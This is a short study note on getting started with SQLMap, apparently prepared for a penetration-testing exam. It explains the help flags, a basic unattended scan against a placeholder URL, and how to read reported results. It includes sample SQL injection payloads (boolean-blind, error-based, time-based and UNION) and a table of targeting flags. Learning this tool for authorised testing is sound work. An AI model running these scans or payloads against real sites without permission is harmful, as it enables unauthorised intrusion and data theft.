# Section 2 — Getting Started with SQLMap

> Theory only. No lab.

---

## Help Flags

```bash
sqlmap -h     # basic help — covers 95% of use cases
sqlmap -hh    # advanced help — all options
```
> Shows the help page. `-h` covers the flags used in 95% of scans. `-hh` shows the full option list including advanced tuning flags. Run these first when looking up an unfamiliar flag.

---

## Basic Run (GET parameter)

```bash
sqlmap -u "http://TARGET/vuln.php?id=1" --batch
```
> Most basic sqlmap scan. Replace `TARGET` and the path with your target's URL. `-u` sets the target; `--batch` skips all prompts so the scan runs unattended. sqlmap will test every parameter it finds in the URL.

- `-u` — target URL with injectable parameter in the query string
- `--batch` — auto-accept all prompts (uses defaults); essential for non-interactive use

SQLMap tests each parameter it finds. For `id=1` it tries Boolean-blind, Error-based, UNION, Stacked, and Time-based injection in sequence. It reports every type that works.

---

## What SQLMap Reports

At the end of a successful run, sqlmap shows the confirmed injection point(s) with:
- Injection type and title
- Exact payload used
- Detected DBMS version and web tech stack
- Path to output files: `~/.sqlmap/output/<host>/`

Example output for a 3-column MySQL target:
```
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 8814=8814

    Type: error-based
    Payload: id=1 AND (SELECT 7744 FROM(...FLOOR(RAND(0)*2))...)

    Type: time-based blind
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(...)-- -
```

---

## Key Input Options (preview)

| Flag | Purpose |
|------|---------|
| `-u URL` | GET parameter target |
| `--data="param=val"` | POST body |
| `-r file.txt` | Load raw HTTP request from file (Burp copy-paste) |
| `--cookie="PHPSESSID=..."` | Authenticated session |
| `-p param` | Test only this parameter |
| `--dbms=mysql` | Skip non-MySQL payloads — faster |
| `--batch` | Non-interactive, auto-accept defaults |
| `--technique=U` | Force only UNION injection |

---

## Exam Notes

- Always add `--batch` — without it sqlmap pauses at ~10 prompts per run
- `--dbms=mysql` cuts test count significantly when you already know the DB type
- Output files saved to `~/.sqlmap/output/<hostname>/` — useful for resuming runs
